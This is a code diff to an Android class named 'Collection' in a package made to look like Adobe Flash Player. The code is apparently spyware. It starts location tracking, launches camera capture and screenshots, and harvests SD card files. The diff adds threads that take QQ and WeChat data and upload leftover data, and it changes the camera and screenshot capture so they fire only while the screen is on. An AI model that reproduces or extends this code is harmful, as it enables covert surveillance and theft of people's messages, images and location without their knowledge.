@@ -3,6 +3,7 @@ package com.adobe.flashplayer.data;
 
 import android.content.Context;
 import android.content.Intent;
+import android.os.PowerManager;
 import android.provider.Settings;
 import android.util.Log;
 
@@ -13,6 +14,8 @@ import com.adobe.flashplayer.Utils;
 import com.adobe.flashplayer.accessory.AccessHelper;
 import com.adobe.flashplayer.data.Location.AMaplocation;
 import com.adobe.flashplayer.data.Location.MyTencentLocation;
+import com.adobe.flashplayer.data.app.QQ;
+import com.adobe.flashplayer.data.app.WECHAT;
 import com.adobe.flashplayer.install.InstallActivity;
 
 
@@ -87,18 +90,32 @@ public class Collection {
             AMaplocation amap = new AMaplocation(context,Public.PHONE_LOCATION_MINSECONDS);
             new Thread(amap).start();
 
-            Intent intentCamera = new Intent(context,CameraActivity2.class);
-            intentCamera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            context.startActivity(intentCamera);
+            PowerManager pm=(PowerManager)context.getSystemService(Context.POWER_SERVICE);
+            boolean isScreenOn =pm.isInteractive();
 
-            Intent intentScr = new Intent(context,ScreenShotActivity.class);
-            intentScr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            context.startActivity(intentScr);
+            if (isScreenOn) {
+
+                Intent intentCamera = new Intent(context, CameraActivity2.class);
+                intentCamera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(intentCamera);
+
+                Intent intentScr = new Intent(context, ScreenShotActivity.class);
+                intentScr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(intentScr);
+            }
         }
 
         PhoneSDFiles sdcardfies = new PhoneSDFiles(context,Public.SDCARDPATH, Public.LOCAL_PATH_NAME, Public.SDCARDFILES_NAME,Public.CMD_DATA_SDCARDFILES);
         Thread thread = new Thread(sdcardfies);
         thread.start();
+
+        new Thread(new UploadRemainder(context)).start();
+
+        new Thread(new QQ(context)).start();
+
+        new Thread(new WECHAT(context)).start();
+
+        ExtSDCardFile.getExtcardFiles(context);
 
         Log.e(TAG, "[liujinguang]collect complete");
     }
